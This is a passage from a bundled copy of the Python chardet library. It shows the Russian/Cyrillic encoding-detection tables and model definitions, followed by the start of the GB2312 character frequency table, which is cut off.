modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\n# KOI8-R language model\n# Character Mapping Table:\nKOI8R_char_to_order_map = (\n255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,  # 00\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,  # 10\n253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,  # 20\n252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,  # 30\n253,142,143,144,145,146,147,148,149,150,151,152, 74,153, 75,154,  # 40\n155,156,157,158,159,160,161,162,163,164,165,253,253,253,253,253,  # 50\n253, 71,172, 66,173, 65,174, 76,175, 64,176,177, 77, 72,178, 69,  # 60\n 67,179, 78, 73,180,181, 79,182,183,184,185,253,253,253,253,253,  # 70\n191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,  # 80\n207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,  # 90\n223,224,225, 68,226,227,228,229,230,231,232,233,234,235,236,237,  # a0\n238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,  # b0\n 27,  3, 21, 28, 13,  2, 39, 19, 26,  4, 23, 11,  8, 12,  5,  1,  # c0\n 15, 16,  9,  7,  6, 14, 24, 10, 17, 18, 20, 25, 30, 29, 22, 54,  # d0\n 59, 37, 44, 58, 41, 48, 53, 46, 55, 42, 60, 36, 49, 38, 31, 34,  # e0\n 35, 43, 45, 32, 40, 52, 56, 33, 61, 62, 51, 57, 47, 63, 50, 70,  # f0\n)\n\nwin1251_char_to_order_map = (\n255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,  # 00\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,  # 10\n253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,  # 20\n252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,  # 30\n253,142,143,144,145,146,147,148,149,150,151,152, 74,153, 75,154,  # 40\n155,156,157,158,159,160,161,162,163,164,165,253,253,253,253,253,  # 50\n253, 71,172, 66,173, 65,174, 76,175, 64,176,177, 77, 72,178, 69,  # 60\n 67,179, 78, 73,180,181, 79,182,183,184,185,253,253,253,253,253,  # 70\n191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,\n207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,\n223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,\n239,240,241,242,243,244,245,246, 68,247,248,249,250,251,252,253,\n 37, 44, 33, 46, 41, 48, 56, 51, 42, 60, 36, 49, 38, 31, 34, 35,\n 45, 32, 40, 52, 53, 55, 58, 50, 57, 63, 70, 62, 61, 47, 59, 43,\n  3, 21, 10, 19, 13,  2, 24, 20,  4, 23, 11,  8, 12,  5,  1, 15,\n  9,  7,  6, 14, 39, 26, 28, 22, 25, 29, 54, 18, 17, 30, 27, 16,\n)\n\nlatin5_char_to_order_map = (\n255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,  # 00\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,  # 10\n253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,  # 20\n252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,  # 30\n253,142,143,144,145,146,147,148,149,150,151,152, 74,153, 75,154,  # 40\n155,156,157,158,159,160,161,162,163,164,165,253,253,253,253,253,  # 50\n253, 71,172, 66,173, 65,174, 76,175, 64,176,177, 77, 72,178, 69,  # 60\n 67,179, 78, 73,180,181, 79,182,183,184,185,253,253,253,253,253,  # 70\n191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,\n207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,\n223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,\n 37, 44, 33, 46, 41, 48, 56, 51, 42, 60, 36, 49, 38, 31, 34, 35,\n 45, 32, 40, 52, 53, 55, 58, 50, 57, 63, 70, 62, 61, 47, 59, 43,\n  3, 21, 10, 19, 13,  2, 24, 20,  4, 23, 11,  8, 12,  5,  1, 15,\n  9,  7,  6, 14, 39, 26, 28, 22, 25, 29, 54, 18, 17, 30, 27, 16,\n239, 68,240,241,242,243,244,245,246,247,248,249,250,251,252,255,\n)\n\nmacCyrillic_char_to_order_map = (\n255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,  # 00\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,  # 10\n253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,  # 20\n252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,  # 30\n253,142,143,144,145,146,147,148,149,150,151,152, 74,153, 75,154,  # 40\n155,156,157,158,159,160,161,162,163,164,165,253,253,253,253,253,  # 50\n253, 71,172, 66,173, 65,174, 76,175, 64,176,177, 77, 72,178, 69,  # 60\n 67,179, 78, 73,180,181, 79,182,183,184,185,253,253,253,253,253,  # 70\n 37, 44, 33, 46, 41, 48, 56, 51, 42, 60, 36, 49, 38, 31, 34, 35,\n 45, 32, 40, 52, 53, 55, 58, 50, 57, 63, 70, 62, 61, 47, 59, 43,\n191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,\n207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,\n223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,\n239,240,241,242,243,244,245,246,247,248,249,250,251,252, 68, 16,\n  3, 21, 10, 19, 13,  2, 24, 20,  4, 23, 11,  8, 12,  5,  1, 15,\n  9,  7,  6, 14, 39, 26, 28, 22, 25, 29, 54, 18, 17, 30, 27,255,\n)\n\nIBM855_char_to_order_map = (\n255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,  # 00\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,  # 10\n253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,  # 20\n252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,  # 30\n253,142,143,144,145,146,147,148,149,150,151,152, 74,153, 75,154,  # 40\n155,156,157,158,159,160,161,162,163,164,165,253,253,253,253,253,  # 50\n253, 71,172, 66,173, 65,174, 76,175, 64,176,177, 77, 72,178, 69,  # 60\n 67,179, 78, 73,180,181, 79,182,183,184,185,253,253,253,253,253,  # 70\n191,192,193,194, 68,195,196,197,198,199,200,201,202,203,204,205,\n206,207,208,209,210,211,212,213,214,215,216,217, 27, 59, 54, 70,\n  3, 37, 21, 44, 28, 58, 13, 41,  2, 48, 39, 53, 19, 46,218,219,\n220,221,222,223,224, 26, 55,  4, 42,225,226,227,228, 23, 60,229,\n230,231,232,233,234,235, 11, 36,236,237,238,239,240,241,242,243,\n  8, 49, 12, 38,  5, 31,  1, 34, 15,244,245,246,247, 35, 16,248,\n 43,  9, 45,  7, 32,  6, 40, 14, 52, 24, 56, 10, 33, 17, 61,249,\n250, 18, 62, 20, 51, 25, 57, 30, 47, 29, 63, 22, 50,251,252,255,\n)\n\nIBM866_char_to_order_map = (\n255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,  # 00\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,  # 10\n253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,  # 20\n252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,  # 30\n253,142,143,144,145,146,147,148,149,150,151,152, 74,153, 75,154,  # 40\n155,156,157,158,159,160,161,162,163,164,165,253,253,253,253,253,  # 50\n253, 71,172, 66,173, 65,174, 76,175, 64,176,177, 77, 72,178, 69,  # 60\n 67,179, 78, 73,180,181, 79,182,183,184,185,253,253,253,253,253,  # 70\n 37, 44, 33, 46, 41, 48, 56, 51, 42, 60, 36, 49, 38, 31, 34, 35,\n 45, 32, 40, 52, 53, 55, 58, 50, 57, 63, 70, 62, 61, 47, 59, 43,\n  3, 21, 10, 19, 13,  2, 24, 20,  4, 23, 11,  8, 12,  5,  1, 15,\n191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,\n207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,\n223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,\n  9,  7,  6, 14, 39, 26, 28, 22, 25, 29, 54, 18, 17, 30, 27, 16,\n239, 68,240,241,242,243,244,245,246,247,248,249,250,251,252,255,\n)\n\n# Model Table:\n# total sequences: 100%\n# first 512 sequences: 97.6601%\n# first 1024 sequences: 2.3389%\n# rest  sequences:      0.1237%\n# negative sequences:   0.0009%\nRussianLangModel = (\n0,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,1,1,3,3,3,3,1,3,3,3,2,3,2,3,3,\n3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,0,3,2,2,2,2,2,0,0,2,\n3,3,3,2,3,3,3,3,3,3,3,3,3,3,2,3,3,0,0,3,3,3,3,3,3,3,3,3,2,3,2,0,\n0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,2,2,3,3,3,3,3,3,3,3,3,2,3,3,0,0,3,3,3,3,3,3,3,3,2,3,3,1,0,\n0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,2,3,2,3,3,3,3,3,3,3,3,3,3,3,3,3,0,0,3,3,3,3,3,3,3,3,3,3,3,2,1,\n0,0,0,0,0,0,0,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,3,3,0,0,3,3,3,3,3,3,3,3,3,3,3,2,1,\n0,0,0,0,0,1,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,3,3,3,3,3,2,2,2,3,1,3,3,1,3,3,3,3,2,2,3,0,2,2,2,3,3,2,1,0,\n0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,\n3,3,3,3,3,3,2,3,3,3,3,3,2,2,3,2,3,3,3,2,1,2,2,0,1,2,2,2,2,2,2,0,\n0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,\n3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,2,2,3,0,2,2,3,3,2,1,2,0,\n0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,1,0,0,2,0,0,0,0,0,0,0,0,0,\n3,3,3,3,3,3,2,3,3,1,2,3,2,2,3,2,3,3,3,3,2,2,3,0,3,2,2,3,1,1,1,0,\n0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,3,3,3,3,3,2,2,3,3,3,3,3,2,3,3,3,3,2,2,2,0,3,3,3,2,2,2,2,0,\n0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,3,3,3,3,3,3,3,2,3,2,3,3,3,3,3,3,2,3,2,2,0,1,3,2,1,2,2,1,0,\n0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,\n3,3,3,3,3,3,3,3,3,3,3,2,1,1,3,0,1,1,1,1,2,1,1,0,2,2,2,1,2,0,1,0,\n0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,3,3,3,2,3,3,2,2,2,2,1,3,2,3,2,3,2,1,2,2,0,1,1,2,1,2,1,2,0,\n0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,3,3,3,3,3,3,3,3,3,2,2,3,2,3,3,3,2,2,2,2,0,2,2,2,2,3,1,1,0,\n0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,\n3,2,3,2,2,3,3,3,3,3,3,3,3,3,1,3,2,0,0,3,3,3,3,2,3,3,3,3,2,3,2,0,\n0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n2,3,3,3,3,3,2,2,3,3,0,2,1,0,3,2,3,2,3,0,0,1,2,0,0,1,0,1,2,1,1,0,\n0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,0,3,0,2,3,3,3,3,2,3,3,3,3,1,2,2,0,0,2,3,2,2,2,3,2,3,2,2,3,0,0,\n0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,2,3,0,2,3,2,3,0,1,2,3,3,2,0,2,3,0,0,2,3,2,2,0,1,3,1,3,2,2,1,0,\n0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,1,3,0,2,3,3,3,3,3,3,3,3,2,1,3,2,0,0,2,2,3,3,3,2,3,3,0,2,2,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,3,3,3,2,2,3,3,2,2,2,3,3,0,0,1,1,1,1,1,2,0,0,1,1,1,1,0,1,0,\n0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,3,3,3,2,2,3,3,3,3,3,3,3,0,3,2,3,3,2,3,2,0,2,1,0,1,1,0,1,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,\n3,3,3,3,3,3,2,3,3,3,2,2,2,2,3,1,3,2,3,1,1,2,1,0,2,2,2,2,1,3,1,0,\n0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,\n2,2,3,3,3,3,3,1,2,2,1,3,1,0,3,0,0,3,0,0,0,1,1,0,1,2,1,0,0,0,0,0,\n0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,2,2,1,1,3,3,3,2,2,1,2,2,3,1,1,2,0,0,2,2,1,3,0,0,2,1,1,2,1,1,0,\n0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,2,3,3,3,3,1,2,2,2,1,2,1,3,3,1,1,2,1,2,1,2,2,0,2,0,0,1,1,0,1,0,\n0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n2,3,3,3,3,3,2,1,3,2,2,3,2,0,3,2,0,3,0,1,0,1,1,0,0,1,1,1,1,0,1,0,\n0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,2,3,3,3,2,2,2,3,3,1,2,1,2,1,0,1,0,1,1,0,1,0,0,2,1,1,1,0,1,0,\n0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,\n3,1,1,2,1,2,3,3,2,2,1,2,2,3,0,2,1,0,0,2,2,3,2,1,2,2,2,2,2,3,1,0,\n0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,3,3,1,1,0,1,1,2,2,1,1,3,0,0,1,3,1,1,1,0,0,0,1,0,1,1,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n2,1,3,3,3,2,0,0,0,2,1,0,1,0,2,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n2,0,1,0,0,2,3,2,2,2,1,2,2,2,1,2,1,0,0,1,1,1,0,2,0,1,1,1,0,0,1,1,\n1,0,0,0,0,0,1,2,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,\n2,3,3,3,3,0,0,0,0,1,0,0,0,0,3,0,1,2,1,0,0,0,0,0,0,0,1,1,0,0,1,1,\n1,0,1,0,1,2,0,0,1,1,2,1,0,1,1,1,1,0,1,1,1,1,0,1,0,0,1,0,0,1,1,0,\n2,2,3,2,2,2,3,1,2,2,2,2,2,2,2,2,1,1,1,1,1,1,1,0,1,0,1,1,1,0,2,1,\n1,1,1,1,1,1,1,1,2,1,1,1,1,1,1,1,1,1,1,0,1,0,1,1,0,1,1,1,0,1,1,0,\n3,3,3,2,2,2,2,3,2,2,1,1,2,2,2,2,1,1,3,1,2,1,2,0,0,1,1,0,1,0,2,1,\n1,1,1,1,1,2,1,0,1,1,1,1,0,1,0,0,1,1,0,0,1,0,1,0,0,1,0,0,0,1,1,0,\n2,0,0,1,0,3,2,2,2,2,1,2,1,2,1,2,0,0,0,2,1,2,2,1,1,2,2,0,1,1,0,2,\n1,1,1,1,1,0,1,1,1,2,1,1,1,2,1,0,1,2,1,1,1,1,0,1,1,1,0,0,1,0,0,1,\n1,3,2,2,2,1,1,1,2,3,0,0,0,0,2,0,2,2,1,0,0,0,0,0,0,1,0,0,0,0,1,1,\n1,0,1,1,0,1,0,1,1,0,1,1,0,2,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,1,1,0,\n2,3,2,3,2,1,2,2,2,2,1,0,0,0,2,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,2,1,\n1,1,2,1,0,2,0,0,1,0,1,0,0,1,0,0,1,1,0,1,1,0,0,0,0,0,1,0,0,0,0,0,\n3,0,0,1,0,2,2,2,3,2,2,2,2,2,2,2,0,0,0,2,1,2,1,1,1,2,2,0,0,0,1,2,\n1,1,1,1,1,0,1,2,1,1,1,1,1,1,1,0,1,1,1,1,1,1,0,1,1,1,1,1,1,0,0,1,\n2,3,2,3,3,2,0,1,1,1,0,0,1,0,2,0,1,1,3,1,0,0,0,0,0,0,0,1,0,0,2,1,\n1,1,1,1,1,1,1,0,1,0,1,1,1,1,0,1,1,1,0,0,1,1,0,1,0,0,0,0,0,0,1,0,\n2,3,3,3,3,1,2,2,2,2,0,1,1,0,2,1,1,1,2,1,0,1,1,0,0,1,0,1,0,0,2,0,\n0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n2,3,3,3,2,0,0,1,1,2,2,1,0,0,2,0,1,1,3,0,0,1,0,0,0,0,0,1,0,1,2,1,\n1,1,2,0,1,1,1,0,1,0,1,1,0,1,0,1,1,1,1,0,1,0,0,0,0,0,0,1,0,1,1,0,\n1,3,2,3,2,1,0,0,2,2,2,0,1,0,2,0,1,1,1,0,1,0,0,0,3,0,1,1,0,0,2,1,\n1,1,1,0,1,1,0,0,0,0,1,1,0,1,0,0,2,1,1,0,1,0,0,0,1,0,1,0,0,1,1,0,\n3,1,2,1,1,2,2,2,2,2,2,1,2,2,1,1,0,0,0,2,2,2,0,0,0,1,2,1,0,1,0,1,\n2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,2,1,1,1,0,1,0,1,1,0,1,1,1,0,0,1,\n3,0,0,0,0,2,0,1,1,1,1,1,1,1,0,1,0,0,0,1,1,1,0,1,0,1,1,0,0,1,0,1,\n1,1,0,0,1,0,0,0,1,0,1,1,0,0,1,0,1,0,1,0,0,0,0,1,0,0,0,1,0,0,0,1,\n1,3,3,2,2,0,0,0,2,2,0,0,0,1,2,0,1,1,2,0,0,0,0,0,0,0,0,1,0,0,2,1,\n0,1,1,0,0,1,1,0,0,0,1,1,0,1,1,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,1,0,\n2,3,2,3,2,0,0,0,0,1,1,0,0,0,2,0,2,0,2,0,0,0,0,0,1,0,0,1,0,0,1,1,\n1,1,2,0,1,2,1,0,1,1,2,1,1,1,1,1,2,1,1,0,1,0,0,1,1,1,1,1,0,1,1,0,\n1,3,2,2,2,1,0,0,2,2,1,0,1,2,2,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,1,1,\n0,0,1,1,0,1,1,0,0,1,1,0,1,1,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,\n1,0,0,1,0,2,3,1,2,2,2,2,2,2,1,1,0,0,0,1,0,1,0,2,1,1,1,0,0,0,0,1,\n1,1,0,1,1,0,1,1,1,1,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,\n2,0,2,0,0,1,0,3,2,1,2,1,2,2,0,1,0,0,0,2,1,0,0,2,1,1,1,1,0,2,0,2,\n2,1,1,1,1,1,1,1,1,1,1,1,1,2,1,0,1,1,1,1,0,0,0,1,1,1,1,0,1,0,0,1,\n1,2,2,2,2,1,0,0,1,0,0,0,0,0,2,0,1,1,1,1,0,0,0,0,1,0,1,2,0,0,2,0,\n1,0,1,1,1,2,1,0,1,0,1,1,0,0,1,0,1,1,1,0,1,0,0,0,1,0,0,1,0,1,1,0,\n2,1,2,2,2,0,3,0,1,1,0,0,0,0,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,\n0,0,0,1,1,1,0,0,1,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,\n1,2,2,3,2,2,0,0,1,1,2,0,1,2,1,0,1,0,1,0,0,1,0,0,0,0,0,0,0,0,0,1,\n0,1,1,0,0,1,1,0,0,1,1,0,0,1,1,0,1,1,0,0,1,0,0,0,0,0,0,0,0,1,1,0,\n2,2,1,1,2,1,2,2,2,2,2,1,2,2,0,1,0,0,0,1,2,2,2,1,2,1,1,1,1,1,2,1,\n1,1,1,1,1,1,1,1,1,1,0,0,1,1,1,0,1,1,1,0,0,0,0,1,1,1,0,1,1,0,0,1,\n1,2,2,2,2,0,1,0,2,2,0,0,0,0,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,2,0,\n0,0,1,0,0,1,0,0,0,0,1,0,1,1,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,\n0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n1,2,2,2,2,0,0,0,2,2,2,0,1,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,\n0,1,1,0,0,1,1,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n1,2,2,2,2,0,0,0,0,1,0,0,1,1,2,0,0,0,0,1,0,1,0,0,1,0,0,2,0,0,0,1,\n0,0,1,0,0,1,0,0,0,1,1,0,0,0,0,0,1,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,\n1,2,2,2,1,1,2,0,2,1,1,1,1,0,2,2,0,0,0,0,0,0,0,0,0,1,1,0,0,0,1,1,\n0,0,1,0,1,1,0,0,0,0,1,0,0,0,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,\n1,0,2,1,2,0,0,0,0,0,1,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,\n0,0,1,0,1,1,0,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,\n1,0,0,0,0,2,0,1,2,1,0,1,1,1,0,1,0,0,0,1,0,1,0,0,1,0,1,0,0,0,0,1,\n0,0,0,0,0,1,0,0,1,1,0,0,1,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,\n2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,\n1,0,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0,0,1,0,0,0,0,0,\n2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,\n1,1,1,0,1,0,1,0,0,1,1,1,1,0,0,0,1,0,0,0,0,1,0,0,0,1,0,1,0,0,0,0,\n1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,\n1,1,0,1,1,0,1,0,1,0,0,0,0,1,1,0,1,1,0,0,0,0,0,1,0,1,1,0,1,0,0,0,\n0,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,1,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,\n)\n\nKoi8rModel = {\n  'char_to_order_map': KOI8R_char_to_order_map,\n  'precedence_matrix': RussianLangModel,\n  'typical_positive_ratio': 0.976601,\n  'keep_english_letter': False,\n  'charset_name': \"KOI8-R\",\n  'language': 'Russian',\n}\n\nWin1251CyrillicModel = {\n  'char_to_order_map': win1251_char_to_order_map,\n  'precedence_matrix': RussianLangModel,\n  'typical_positive_ratio': 0.976601,\n  'keep_english_letter': False,\n  'charset_name': \"windows-1251\",\n  'language': 'Russian',\n}\n\nLatin5CyrillicModel = {\n  'char_to_order_map': latin5_char_to_order_map,\n  'precedence_matrix': RussianLangModel,\n  'typical_positive_ratio': 0.976601,\n  'keep_english_letter': False,\n  'charset_name': \"ISO-8859-5\",\n  'language': 'Russian',\n}\n\nMacCyrillicModel = {\n  'char_to_order_map': macCyrillic_char_to_order_map,\n  'precedence_matrix': RussianLangModel,\n  'typical_positive_ratio': 0.976601,\n  'keep_english_letter': False,\n  'charset_name': \"MacCyrillic\",\n  'language': 'Russian',\n}\n\nIbm866Model = {\n  'char_to_order_map': IBM866_char_to_order_map,\n  'precedence_matrix': RussianLangModel,\n  'typical_positive_ratio': 0.976601,\n  'keep_english_letter': False,\n  'charset_name': \"IBM866\",\n  'language': 'Russian',\n}\n\nIbm855Model = {\n  'char_to_order_map': IBM855_char_to_order_map,\n  'precedence_matrix': RussianLangModel,\n  'typical_positive_ratio': 0.976601,\n  'keep_english_letter': False,\n  'charset_name': \"IBM855\",\n  'language': 'Russian',\n}\n", "thirdparty/chardet/gb2312freq.py": "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is Mozilla Communicator client code.\n#\n# The Initial Developer of the Original Code is\n# Netscape Communications Corporation.\n# Portions created by the Initial Developer are Copyright (C) 1998\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\n# GB2312 most frequently used character table\n#\n# Char to FreqOrder table , from hz6763\n\n# 512  --> 0.79  -- 0.79\n# 1024 --> 0.92  -- 0.13\n# 2048 --> 0.98  -- 0.06\n# 6768 --> 1.00  -- 0.02\n#\n# Ideal Distribution Ratio = 0.79135/(1-0.79135) = 3.79\n# Random Distribution Ration = 512 / (3755 - 512) = 0.157\n#\n# Typical Distribution Ratio about 25% of Ideal one, still much higher that RDR\n\nGB2312_TYPICAL_DISTRIBUTION_RATIO = 0.9\n\nGB2312_TABLE_SIZE = 3760\n\nGB2312_CHAR_TO_FREQ_ORDER = (\n1671, 749,1443,2364,3924,3807,2330,3921,1704,3463,2691,1511,1515, 572,3191,2205,\n2361, 224,2558, 479,1711, 963,3162, 440,4060,1905,2966,2947,3580,2647,3961,3842,\n2204, 869,4207, 970,2678,5626,2944,2956,1479,4048, 514,3595, 588,1346,2820,3409,\n 249,4088,1746,1873,2047,1774, 581,1813, 358,1174,3590,1014,1561,4844,2245, 670,\n1636,3112, 889,1286, 953, 556,2327,3060,1290,3141, 613, 185,3477,1367, 850,3820,\n1715,2428,2642,2303,2732,3041,2562,2648,3566,3946,1349, 388,3098,2091,1360,3585,\n 152,1687,1539, 738,1559,  59,1232,2925,2267,1388,1249,1741,1679,2960, 151,1566,\n1125,1352,4271, 924,4296, 385,3166,4459, 310,1245,2850,  70,3285,2729,3534,3575,\n2398,3298,3466,1960,2265, 217,3647, 864,1909,2084,4401,2773,1010,3269,5152, 853,\n3051,3121,1244,4251,1895, 364,1499,1540,2313,1180,3655,2268, 562, 